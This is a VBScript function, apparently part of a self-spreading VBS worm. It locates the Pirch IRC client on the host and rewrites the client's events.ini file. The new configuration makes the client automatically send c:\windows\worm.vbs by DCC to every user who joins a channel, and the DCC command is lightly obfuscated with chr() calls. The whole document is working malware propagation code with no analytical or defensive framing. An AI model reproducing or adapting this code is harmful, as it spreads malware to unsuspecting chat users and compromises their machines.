Function Pirch(path)
On Error Resume Next
Set fso = CreateObject("scripting.filesystemobject")
Set ws = CreateObject("wscript.shell")
If path = "" Then
If fso.fileexists("c:\pirch\Pirch32.exe") Then path = "c:\pirch"
If fso.fileexists("c:\pirch32\Pirch32.exe") Then path = "c:\pirch32"
pfDir = ws.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If fso.fileexists(pfDir & "\pirch\Pirch32.exe") Then path = pfDir & "\pirch\Pirch32.exe"
End If
If path <> "" Then
Set Script = fso.CreateTextFile(path & "\events.ini", True)
Script.WriteLine "[Levels]"
Script.WriteLine "Enabled=1"
Script.WriteLine "Count=6"
Script.WriteLine "Level1=000-Unknowns"
Script.WriteLine "000-UnknownsEnabled=1"
Script.WriteLine "Level2=100-Level 100"
Script.WriteLine "100-Level 100Enabled=1"
Script.WriteLine "Level3=200-Level 200"
Script.WriteLine "200-Level 200Enabled=1"
Script.WriteLine "Level4=300-Level 300"
Script.WriteLine " 300-Level 300Enabled=1"
Script.WriteLine "Level5=400-Level 400 "
Script.WriteLine "400-Level 400Enabled=1"
Script.WriteLine "Level6=500-Level 500"
Script.WriteLine "500-Level 500Enabled=1"
Script.WriteLine ""
Script.WriteLine "[000-Unknowns]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[100-Level 100]"
Script.WriteLine "User1=*!*@*"
Script.WriteLine "UserCount=1"
Script.WriteLine "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick c:\windows\worm.vbs"
Script.WriteLine "EventCount=1"
Script.WriteLine ""
Script.WriteLine "[200-Level 200]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[300-Level 300]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[400-Level 400]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[500-Level 500]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.Close
End If
End Function
